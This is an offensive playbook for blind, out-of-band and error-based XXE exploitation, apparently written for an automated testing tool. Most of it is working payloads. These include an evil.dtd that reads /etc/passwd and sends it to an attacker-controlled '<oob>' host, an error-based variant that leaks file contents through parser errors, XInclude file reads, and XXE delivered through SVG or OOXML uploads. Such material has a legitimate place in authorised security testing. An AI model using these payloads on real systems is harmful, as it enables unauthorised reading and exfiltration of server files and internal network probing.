# XXE — blind, out-of-band & error-based

Use when NO element is reflected. Two infra models: OOB (needs a listener you
control) and error-based (data comes back in the HTTP response — prefer it when you
have no collaborator).

## Parameter entities (the blind primitive)
General entities (`&x;`) usually can't be used inside the internal subset;
parameter entities (`%x;`) can, and are how blind XXE is built. Every payload below
uses them, and the malicious nesting is loaded from an EXTERNAL DTD because libxml
forbids defining an entity from within a param entity in the *internal* subset.

## Error-based exfil (data returns in the response)
Advantage over OOB: the file content lands in the app's parser error message, so
you only need the parser to FETCH your DTD — no separate data-exfil channel.
`evil.dtd` you serve at `http://<oob>/`:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; err SYSTEM 'file:///nonexistent/%file;'>">
%eval;
%err;
```
Request:
```
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://<oob>/evil.dtd"> %ext; ]><r>x</r>
```
The parser tries to open `/nonexistent/root:x:0:0:...` and echoes it in the
"file not found" error → readable in `http_flow_body`. Good for single-line-ish
content (the first `/etc/passwd` line is enough proof). **Zero-infra variant**: if
a `.dtd` already ships on the server (many apps do), reference *that* local DTD to
trigger "local DTD reuse" instead of hosting one.

## OOB via an external DTD (needs your listener `http://<oob>`)
Request doc:
```
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY % ext SYSTEM "http://<oob>/evil.dtd"> %ext; ]>
<r>&exfil;</r>
```
`evil.dtd`:
```
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY exfil SYSTEM 'http://<oob>/leak?d=%file;'>">
%wrap;
```
The callback query string carries the file. Multi-line files break the URL form —
use FTP exfil or the error-based method for those. mulot hosts no listener; supply
your own collaborator.

## Blind SSRF confirmation without a listener
Point a parameter entity at an internal URL and read a *differential*: a live
internal host vs a dead port gives different response text / timing. Cross-check
`http_history` to see whether the parser reached out at all.

## XInclude — when you can't inject a DOCTYPE
The server builds the XML and drops your string into a sub-element (common in SOAP).
You can't declare entities, but XInclude reads files without a DOCTYPE:
```
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
  <xi:include parse="text" href="file:///etc/passwd"/>
</foo>
```
Requires the parser to have XInclude enabled (libxml `XML_PARSE_XINCLUDE`).

## SVG / OOXML delivery
- **SVG upload** — an SVG is XML; ship the DOCTYPE+entity and reference it in a
  `<text>` node. If the server rasterizes/reads it, the file renders or errors back:
  `<?xml version="1.0"?><!DOCTYPE svg [<!ENTITY x SYSTEM "file:///etc/passwd">]>`
  `<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>`
  Stage it with `browser_upload_file` (`filename:"x.svg"`, `content:...`).
- **OOXML** (`.docx`/`.xlsx`) — inject the XXE into `word/document.xml` or
  `[Content_Types].xml`, re-zip, upload. The file is binary (a zip), so craft it
  locally and upload by `path`, not by inline `content`.
